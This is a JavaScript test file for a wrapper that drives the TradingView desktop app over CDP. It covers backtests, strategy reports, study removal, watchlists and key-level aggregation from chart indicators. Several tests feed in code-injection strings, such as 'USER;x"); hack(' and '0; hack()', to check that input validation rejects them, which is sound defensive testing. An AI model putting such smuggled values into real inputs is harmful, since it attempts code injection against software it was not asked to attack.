  assert.ok(expr.includes("api.chart(1)"), "should target chart 1");
  assert.ok(!expr.includes("removeEntity"), "must never remove studies");
});

test("removePineFromChart validates ownership before removing one exact study", async () => {
  const cdp = fakeCdp({ removed: true });
  const tv = new TradingView(cdp);
  assert.throws(
    () => tv.removePineFromChart("PUB;abcdef1234567890", "st1"),
    /pineId must look like/,
  );
  assert.throws(
    () => tv.removePineFromChart("USER;adc40b1dfee344f19412f1ae9af74f3f", "has space"),
    /studyId must match/,
  );
  assert.equal(cdp.calls.length, 0);

  await tv.removePineFromChart("USER;adc40b1dfee344f19412f1ae9af74f3f", "st1", 1);
  const expr = cdp.calls[0];
  assert.ok(expr.includes('value.id === "pineId"'));
  assert.ok(expr.includes('actualPineId !== pineId'));
  assert.ok(expr.includes('chart.removeEntity(studyId)'));
  assert.ok(expr.indexOf('actualPineId !== pineId') < expr.indexOf('chart.removeEntity(studyId)'));
  assert.ok(expr.includes('api.chart(1)'));
});

test("getStrategyReport is read-only and refuses stale reports", async () => {
  const cdp = fakeCdp({});
  const tv = new TradingView(cdp);
  assert.throws(() => tv.getStrategyReport({ tradesLimit: 0 }), /tradesLimit must be/);
  assert.throws(() => tv.getStrategyReport({ tradesLimit: 501 }), /tradesLimit must be/);
  assert.throws(() => tv.getStrategyReport({ tradesLimit: 2.5 }), /tradesLimit must be/);
  assert.equal(cdp.calls.length, 0);

  await tv.getStrategyReport({ tradesLimit: 10 });
  const expr = cdp.calls[0];
  assert.ok(expr.includes("activeStrategyReportData"), "must read the strategy tester data");
  // a removed strategy leaves its report behind: the gate must reject it
  assert.ok(expr.includes("act === null || act === undefined"), "stale reports must be refused");
  assert.ok(expr.includes("no strategy report available"), "missing report must fail clearly");
  assert.ok(!expr.includes("createStudy") && !expr.includes("removeEntity"), "must not touch the chart");
});

test("runBacktest validates inputs and cleans the chart up by default", async () => {
  const cdp = fakeCdp({});
  const tv = new TradingView(cdp);
  for (const bad of ["PUB;abcdef1234567890", "USER;short", "", 'USER;x"); hack(']) {
    assert.throws(() => tv.runBacktest({ pineId: bad }), /pineId must look like/, bad);
  }
  assert.throws(
    () => tv.runBacktest({ pineId: "USER;71f1e4e6807c4bb48bd55edb886908a0", tradesLimit: 501 }),
    /tradesLimit must be/,
  );
  assert.equal(cdp.calls.length, 0);

  await tv.runBacktest({ pineId: "USER;71f1e4e6807c4bb48bd55edb886908a0" });
  const expr = cdp.calls[0];
  assert.ok(expr.includes('"USER;71f1e4e6807c4bb48bd55edb886908a0"'), "pineId quoted as JSON");
  assert.ok(expr.includes("isTVScriptStrategy !== true"), "non-strategy scripts must be refused");
  assert.ok(expr.includes('{ type: "pine", pineId, version: "last" }'), "insert by pine descriptor");
  assert.ok(expr.includes("const keep = false"), "auto-remove is the default");
  assert.ok(expr.includes("chart.removeEntity(studyId)"), "must remove the strategy again");
  assert.ok(expr.includes("activeDesc === meta.description"),
    "the report must be attributed to OUR strategy before being accepted");
  // re-testing a saved new version keeps the same strategy name, so the
  // previous run must be rejected by object identity, not just by name
  assert.ok(expr.includes("const staleReport = bt.activeStrategyReportData.value()"),
    "the pre-run report must be captured");
  assert.ok(expr.includes("raw !== staleReport"),
    "a leftover report of the same-named strategy must be refused");
  assert.ok(expr.includes("WARNING: the strategy may still be on the chart"),
    "failed cleanup must be reported");

  await tv.runBacktest({ pineId: "USER;71f1e4e6807c4bb48bd55edb886908a0", keepOnChart: true });
  assert.ok(cdp.calls[1].includes("const keep = true"));
});

test("getChartRect validates the index and reads the chart container rect", async () => {
  const cdp = fakeCdp({ x: 0, y: 0, width: 100, height: 100, devicePixelRatio: 2 });
  const tv = new TradingView(cdp);
  assert.throws(() => tv.getChartRect(-1), /chartIndex must be/);
  assert.throws(() => tv.getChartRect(1.5), /chartIndex must be/);
  assert.throws(() => tv.getChartRect("0; hack()"), /chartIndex must be/);
  assert.equal(cdp.calls.length, 0);

  await tv.getChartRect(1);
  const expr = cdp.calls[0];
  assert.ok(expr.includes('querySelectorAll(".chart-container")'));
  assert.ok(expr.includes("out of range"), "must fail clearly for a missing chart");
  assert.ok(expr.includes("devicePixelRatio"));
});

test("getWatchlists fetches the symbols_list API with the app session", async () => {
  const cdp = fakeCdp([]);
  const tv = new TradingView(cdp);
  await tv.getWatchlists();
  const expr = cdp.calls[0];
  assert.ok(expr.includes("https://www.tradingview.com/api/v1/symbols_list/custom/"));
  assert.ok(expr.includes('credentials: "include"'), "must use the logged-in session");
  assert.ok(expr.includes('startsWith("###")'), "must handle section headers");
});

test("getChartContext returns the page value as-is", async () => {
  const ctx = { layoutName: "L", activeChartIndex: 0, chartsCount: 1, charts: [] };
  const tv = new TradingView(fakeCdp(ctx));
  assert.deepEqual(await tv.getChartContext(), ctx);
});

test("getExecutionQuotes reads bounded live quote and session fields from every chart", async () => {
  const cdp = fakeCdp([]);
  const tv = new TradingView(cdp);
  await tv.getExecutionQuotes();
  const expr = cdp.calls[0];
  assert.ok(expr.includes("series.quotes"));
  assert.ok(expr.includes("quote.lp_time"));
  assert.ok(expr.includes("quote.current_session"));
  assert.ok(expr.includes("quote.hub_rt_loaded"));
  assert.ok(expr.includes("info.session"));
});

test("indicator values and graphics expose the is_price_study flag", async () => {
  const cdp = fakeCdp([]);
  const tv = new TradingView(cdp);
  await tv.getIndicatorValues();
  await tv.getIndicatorGraphics();
  for (const expr of cdp.calls) {
    assert.ok(expr.includes("is_price_study"), "metaInfo flag must be read");
  }
});

/** Fake CdpClient that returns one queued result (or Error) per evaluate call. */
function fakeCdpSeq(results) {
  const calls = [];
  let i = 0;
  return {
    calls,
    evaluate(expression) {
      calls.push(expression);
      const r = results[i++];
      return r instanceof Error ? Promise.reject(r) : Promise.resolve(r);
    },
  };
}

// getKeyLevels evaluates in a fixed order: OHLCV, then values, then graphics.
const keyLevelsOhlcv = {
  symbol: "OANDA:EURUSD",
  resolution: "1D",
  count: 1,
  bars: [{ time: 1000, timeIso: "x", open: 100, high: 100, low: 100, close: 100, volume: 1 }],
};
const keyLevelsValues = [
  // oscillator pane: its "prices" must never become levels
  { id: "a", name: "RSI", isPriceStudy: false, plots: [], bars: [{ time: 1000, values: { Signal: 100.5 } }] },
  {
    id: "b",
    name: "SR",
    isPriceStudy: true,
    plots: [],
    bars: [
      {
        time: 1000,
        // high / close / plot_5 are in-band but generically titled: the
        // current bar's own prices must not come back as "key levels"
        values: { R1: 102, S1: 98, Far: 200, Txt: "x", Nul: null, high: 100.4, close: 100.1, plot_5: 99.8 },
      },
    ],
  },
  // no flag at all: keep (only an explicit false excludes)
  { id: "c", name: "NoFlag", plots: [], bars: [{ time: 1000, values: { Pivot: 99 } }] },
];
const keyLevelsGraphics = [
  {
    id: "d",
    name: "SMC",
    isPriceStudy: true,
    totals: { labels: 1, lines: 3, boxes: 1 },
    labels: [{ time: 1500, price: 99.5, text: "OB", size: null }],
    lines: [
      { time1: 1, price1: 101, time2: 2000, price2: 101, extend: "right", width: 1 },
      { time1: 1, price1: 101, time2: 2000, price2: 101, extend: "right", width: 1 }, // duplicate
      { time1: 1, price1: 90, time2: 2000, price2: 101.5, extend: null, width: 1 }, // sloped
    ],
    boxes: [{ time1: 1, time2: 2000, priceHigh: 102.5, priceLow: 97.5, text: "FVG" }],
  },
  {
    id: "e",
    name: "OscDraw",
    isPriceStudy: false,
    totals: { labels: 1, lines: 0, boxes: 0 },
    labels: [{ time: 1, price: 100.2, text: "osc", size: null }],
    lines: [],
    boxes: [],
  },
];

test("getKeyLevels validates inputs before touching the page", async () => {
  const cdp = fakeCdp();
  const tv = new TradingView(cdp);
  for (const bad of [0, -1, 51, NaN]) {
    await assert.rejects(() => tv.getKeyLevels({ rangePercent: bad }), /rangePercent must be/, String(bad));
  }
  for (const bad of [0, 201, 1.5]) {
    await assert.rejects(() => tv.getKeyLevels({ limit: bad }), /limit must be/, String(bad));
  }
  await assert.rejects(() => tv.getKeyLevels({ chartIndex: -1 }), /chartIndex must be/);
  assert.equal(cdp.calls.length, 0, "no expression should reach the page");
});

test("getKeyLevels aggregates plots, horizontal lines, box edges and labels near price", async () => {
  const cdp = fakeCdpSeq([keyLevelsOhlcv, keyLevelsValues, keyLevelsGraphics]);
  const tv = new TradingView(cdp);
  const r = await tv.getKeyLevels();

  assert.equal(r.symbol, "OANDA:EURUSD");
  assert.equal(r.price, 100);
  assert.equal(r.rangePercent, 3);
  // sorted by absolute distance; duplicates collapsed; oscillators, the
  // out-of-band plot (200), non-numeric values, sloped lines and
  // generically-titled plots (high/close/plot_5) excluded
  assert.deepEqual(
    r.levels.map((l) => [l.price, l.kind, l.study, l.detail]),
    [
      [99.5, "label", "SMC", "OB"],
      [99, "plot", "NoFlag", "Pivot"],
      [101, "line", "SMC", "horizontal line (extend: right)"],
      [102, "plot", "SR", "R1"],
      [98, "plot", "SR", "S1"],
      [102.5, "box", "SMC", "box top: FVG"],
      [97.5, "box", "SMC", "box bottom: FVG"],
    ],
  );
  assert.equal(r.count, 7);
  assert.equal(r.levels[0].distancePercent, -0.5);
  assert.equal(r.levels[3].distancePercent, 2);
  assert.ok(!JSON.stringify(r).includes("100.5"), "oscillator values must not leak");
  for (const near of [100.4, 100.1, 99.8]) {
    assert.ok(
      !r.levels.some((l) => l.price === near),
      `generic plot value ${near} must not become a level`,
    );
  }
});

test("getKeyLevels includeAllPlots keeps generically-titled plots", async () => {
  const tv = new TradingView(fakeCdpSeq([keyLevelsOhlcv, keyLevelsValues, keyLevelsGraphics]));
  const r = await tv.getKeyLevels({ includeAllPlots: true });
  for (const near of [100.4, 100.1, 99.8]) {
    assert.ok(r.levels.some((l) => l.price === near), `expected ${near} with includeAllPlots`);
  }
});

test("getKeyLevels honors rangePercent and limit", async () => {
  const narrow = new TradingView(fakeCdpSeq([keyLevelsOhlcv, keyLevelsValues, keyLevelsGraphics]));
  const r1 = await narrow.getKeyLevels({ rangePercent: 1 });
  assert.deepEqual(r1.levels.map((l) => l.price), [99.5, 99, 101]);

  const limited = new TradingView(fakeCdpSeq([keyLevelsOhlcv, keyLevelsValues, keyLevelsGraphics]));
  const r2 = await limited.getKeyLevels({ limit: 2 });
  assert.deepEqual(r2.levels.map((l) => l.price), [99.5, 99]);
  assert.equal(r2.count, 2);
});

test("getKeyLevels treats a chart without indicators as zero levels", async () => {
  const noStudies = new Error("no indicators on this chart");
  const tv = new TradingView(fakeCdpSeq([keyLevelsOhlcv, noStudies, noStudies]));
  const r = await tv.getKeyLevels();
  assert.equal(r.count, 0);
  assert.deepEqual(r.levels, []);
});

test("getKeyLevels propagates real failures instead of hiding them", async () => {
  const tv = new TradingView(
    fakeCdpSeq([keyLevelsOhlcv, keyLevelsValues, new Error("TradingView desktop app is not reachable")]),
  );
  await assert.rejects(() => tv.getKeyLevels(), /not reachable/);

  const noBars = new TradingView(fakeCdpSeq([{ ...keyLevelsOhlcv, bars: [] }]));
  await assert.rejects(() => noBars.getKeyLevels(), /no bar data loaded/);
});
